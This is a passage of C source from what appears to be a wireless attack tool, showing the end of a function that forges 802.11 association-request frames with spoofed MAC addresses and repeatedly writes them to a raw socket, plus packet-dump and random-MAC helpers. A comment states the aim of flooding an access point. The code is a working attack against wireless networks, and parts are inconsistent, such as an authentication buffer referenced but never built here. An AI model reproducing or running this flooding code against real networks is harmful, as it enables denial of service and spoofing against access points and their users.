  unsigned char pack_buf_ass[CONSERVATIVE_PACK_LEN], *packet,*loc_addr_ass,*loc_addr_auth;
  unsigned int pack_len_ass,pack_len_auth;
  unsigned char spoof_mac[WLAN_ADDR_LEN];
  unsigned int n_written;
  int index;

  __u16 nu16;
  __u8 nu8;

  // Generate the association packet
  packet  = &pack_buf_ass[0];

  nu8 = (WLAN_PROTO_VER | (WLAN_FTYPE_MGMT << 2) | (WLAN_MGMT_AS_REQ << 4));
  PACK_ADD(packet,nu8);  
  nu8 = flags;
  PACK_ADD(packet,nu8);

  nu16=duration;
  PACK_ADD(packet,nu16);
  //lp us quickly forge a new ass req 
  // from a diff mac and send it out on the air to the poor AP
  loc_addr_ass = packet+WLAN_ADDR_LEN;

  memcpy(packet,dest_mac,WLAN_ADDR_LEN);
  memcpy(packet+WLAN_ADDR_LEN,src_mac,WLAN_ADDR_LEN);
  memcpy(packet+2*WLAN_ADDR_LEN,src_mac,WLAN_ADDR_LEN);
	
  packet = packet + 3 * WLAN_ADDR_LEN;
  nu16 = (fragment) | (sequence << 4);
  PACK_ADD(packet,nu16); //end damon add sequence number

#ifdef PRISM
  packet += WLAN_ADDR_LEN;
#endif
  // the xtra WLAN_ADDR_LEN is because the driver needs padding for address 4
  //and skip 16 bits for sequence control info added by driver
	
  nu16 = WLAN_DEFAULT_CAPA_ASS;
  PACK_ADD(packet,nu16);

  nu16 = WLAN_DEFAULT_LISTEN_INT;
  PACK_ADD(packet, nu16);
	
	
  packet[0] = (__u8)WLAN_IE_SSID;
  nu8 = (__u8)(ssid ? strlen(ssid):strlen(WLAN_DEFAULT_SSID));
  packet[1] = nu8;
  memcpy(&packet[2],ssid ? ssid:WLAN_DEFAULT_SSID,nu8);
  packet += 2 + nu8;
	
  packet[0] = (__u8)WLAN_IE_SUPPR;
  nu8 = (__u8)WLAN_DEFAULT_SUPPR_LEN;
  packet[1] = nu8;
  memcpy(&packet[2],WLAN_DEFAULT_SUPPR,nu8);
  packet += 2 + nu8;

  pack_len_ass = packet - &pack_buf_ass[0] ;

	
#ifdef DEBUG
  packet_dump(&pack_buf_auth[0],pack_len_auth);
  packet_dump(&pack_buf_ass[0],pack_len_ass);
#endif	

  for(index =0; index <count; index ++) {
    //if(write(fd_sock,&pack_buf_auth[0],pack_len_auth) <0)
    //	  break;
    //	usleep(delay);
	
    n_written = write(fd_sock,&pack_buf_ass[0],pack_len_ass);
    printf("forge_associate : %d bytes written\n", n_written);
	usleep(delay);
		
	//if(random_mac(loc_addr_auth,&spoof_mac[0],3)) 
#ifdef DEBUG			
	  printf("random_mac failed!\n");
#endif			
	
	
		
#ifdef DEBUG
//  printf("forge_associate: ass from ");
	DISPLAY_MAC(loc_addr_auth);
	printf("\n");
#endif	
  }
  // perror("");
  //printf("forge_associate: socket write failed!\n");
  return 1;

}

#ifdef DEBUG
int packet_dump(unsigned char *packet, unsigned int len) 
{
  register int i;

  printf("*** packet dump starts ***\n");
  printf("HEX\n");
  for(i=0;i < len;i++) {
	printf("%x ",packet[i]);
  }
  printf("\n\nASCII\n");
  for(i=0;i < len;i++) {
	printf("%c ",packet[i]);
  }
	
  printf("\n*** packet dump ends ***\n");
  return 0;
}
#endif

static int  random_mac(unsigned char *mac, unsigned char *rnd_mac,unsigned int offset) 
{
  register int i;
	
  if(offset >= WLAN_ADDR_LEN)
	return 1;

  memcpy(rnd_mac,mac,offset);
	
  for(i=offset; i < WLAN_ADDR_LEN; i++) {
	rnd_mac[i] = (mac[i]  + time(NULL)) % 0xff; 
  }
  return 0;
}

